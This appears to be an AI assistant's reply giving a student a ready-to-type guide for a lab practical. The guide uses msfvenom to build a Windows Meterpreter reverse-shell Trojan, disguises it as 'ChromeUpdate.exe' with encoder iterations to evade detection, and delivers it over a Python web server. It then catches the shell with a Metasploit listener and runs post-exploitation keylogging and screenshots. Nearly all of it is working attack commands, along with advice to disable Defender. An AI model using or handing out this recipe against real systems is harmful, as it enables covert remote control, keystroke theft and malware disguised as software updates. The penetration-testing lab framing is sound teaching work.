This is the big one—the exact type of exploit you'd need to defend against when building the infrastructure for your startup. 

Based on your lab manual screenshots, here is the **ready-made, step-by-step execution guide** for creating a Trojan and getting a reverse shell via Metasploit. Keep this open during your lab tomorrow so you can just read and type.

---

# 💻 Practical: Create Trojan & Exploit Windows using Metasploit

## 📍 Pre-Flight Check (Crucial First Step)
Before typing any Metasploit commands, you need to know your Attacker (Kali) IP address.
1. Open a terminal and type: `ifconfig`
2. Note down your IP address (e.g., `192.168.x.x` or `10.0.x.x`). We will call this `<Your_Kali_IP>`.

---

## 🛠️ Step-by-Step Execution Procedure

### Phase 1: Metasploit Setup & Initialization
*Note: Your manual shows a `snap` error, so use `apt` if it's not already installed.*
```bash
# 1. Install Metasploit (If not already installed in the lab)
sudo apt update && sudo apt install metasploit-framework

# 2. Initialize the database (Crucial for searching exploits faster)
sudo msfdb init

# 3. Launch the Metasploit Console
msfconsole

# 4. Check database connection
db_status
```

### Phase 2: Generating the Payload (Msfvenom)
*Open a **new, separate terminal window** for this step (keep `msfconsole` running in the background).*

**Option A: Basic Standalone Payload**
```bash
msfvenom --payload windows/meterpreter/reverse_tcp \
--arch x86 --format exe \
LHOST=<Your_Kali_IP> LPORT=4444 > windowsMeterpreter.exe
```

**Option B: The "Trojan" Payload (Embedded in a legit file)**
*Only do this if the examiner asks to see it disguised as an update.*
```bash
msfvenom --payload windows/meterpreter/reverse_tcp \
--template /home/kali/Downloads/ChromeUpdate.exe \
--arch x86 --format exe \
--encoding x86/shikata_ga_nai --iterations 500 \
LHOST=<Your_Kali_IP> LPORT=4444 > windowsMeterpreter.exe
```

### Phase 3: Delivering the Payload
* Move the `windowsMeterpreter.exe` file to the Windows Target Machine.
* *Lab workaround:* You can usually drag-and-drop it into the Windows VM, or start a quick python web server (`python3 -m http.server 80`) and download it from the Windows browser.

### Phase 4: Configuring the Listener (The "Catcher")
*Go back to your terminal window where `msfconsole` is running.*
```bash
# 1. Start the generic handler
use exploit/multi/handler

# 2. Set the exact same payload you generated
set payload windows/meterpreter/reverse_tcp

# 3. Set your Kali IP and the Port you used
set LHOST <Your_Kali_IP>
set LPORT 4444

# 4. Verify your settings (Make sure LHOST is correct!)
show options

# 5. Start listening
exploit
```

### Phase 5: The Exploit
1. Go to the Windows target machine.
2. Double-click the `windowsMeterpreter.exe` file.
3. Switch back to your Kali machine. You should see a message saying `Meterpreter session 1 opened`. **You are in.**

---

## 💥 Bonus: Meterpreter Post-Exploitation Commands
Once you see the `meterpreter >` prompt, type these to show the examiner you actually control the machine:
* `sysinfo`: Shows the target's operating system details.
* `screenshot`: Takes a screenshot of the Windows desktop and saves it to your Kali machine.
* `keyscan_start`: Starts logging their keystrokes.
* `keyscan_dump`: Shows you what they typed.
* `shell`: Drops you into a standard Windows Command Prompt.

---

## 📝 Conclusion for your output/report
In this experiment, a Trojan payload was successfully created and deployed using the Metasploit framework to exploit a Windows machine and gain remote access through a Meterpreter reverse shell. The experiment demonstrated the exploitation and post-exploitation phases of penetration testing, showing how attackers can control a target system if proper security measures are not implemented.

---

**Pro Tip:** If the listener fails to connect when you click the file on Windows, check the Windows Defender/Firewall settings on the target machine. In a lab environment, Defender usually needs to be turned off temporarily for the reverse shell to connect back to you! 😈 

You are fully prepped. Go dominate that practical!